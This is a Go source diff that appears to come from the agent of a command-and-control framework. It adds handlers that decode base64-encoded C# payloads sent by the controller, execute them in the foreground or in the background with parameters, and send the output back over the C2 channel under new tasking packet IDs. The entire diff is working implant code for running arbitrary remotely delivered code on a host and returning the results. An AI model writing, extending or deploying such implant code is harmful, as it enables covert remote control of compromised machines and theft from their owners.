@@ -15,6 +15,7 @@ import (
 	mathrand "math/rand"
 	"net/http"
 	"os"
+	"strings"
 	"time"
 )
 
@@ -36,9 +37,30 @@ func (ph *PacketHandler) powershellTask(data []byte, resultID int) {
 }
 
 func (ph *PacketHandler) csharpTask(data []byte, resultID int) {
-	script := fmt.Sprintf(tasks.PowerShellScript, data)
-	result := tasks.RunTempPowerShellScript(script)
-	ph.SendMessage(ph.BuildResponsePacket(112, result, resultID))
+	dataStr := string(data)
+	parts := strings.Split(dataStr, ",")
+	params := parts[1:]
+	dataBytes, _ := base64.StdEncoding.DecodeString(parts[0])
+
+	// Run the C# task
+	result := tasks.Runcsharptask(dataBytes, params)
+
+	// Send the captured output back
+	ph.SendMessage(ph.BuildResponsePacket(120, result, resultID))
+}
+
+// csharpTaskBackground runs the C# task in the background and sends the result when done
+func (ph *PacketHandler) csharpTaskBackground(data []byte, resultID int) {
+	dataStr := string(data)
+	parts := strings.Split(dataStr, ",")
+	params := parts[1:]
+	dataBytes, _ := base64.StdEncoding.DecodeString(parts[0])
+
+	// Run the C# task in the background, with a callback to send the result back
+	tasks.RunCsharpTaskInBackground(dataBytes, params, func(result string) {
+		// Callback function to send the result back when the task finishes
+		ph.SendMessage(ph.BuildResponsePacket(122, result, resultID))
+	})
 }
 
 func (ph *PacketHandler) buildRoutingPacket(stagingKey []byte, sessionID string, meta int, encData []byte) []byte {
@@ -248,8 +270,11 @@ func (ph *PacketHandler) processPacket(packetType uint16, data []byte, resultID 
 	case 100, 101, 102:
 		ph.powershellTask(data, resultID)
 		return ""
-	case 122, 123:
+	case 120:
 		ph.csharpTask(data, resultID)
+		return ""
+	case 122:
+		ph.csharpTaskBackground(data, resultID)
 		return ""
 	default:
 		ph.SendMessage(ph.BuildResponsePacket(0, fmt.Sprintf("invalid tasking ID: %d", packetType), resultID))
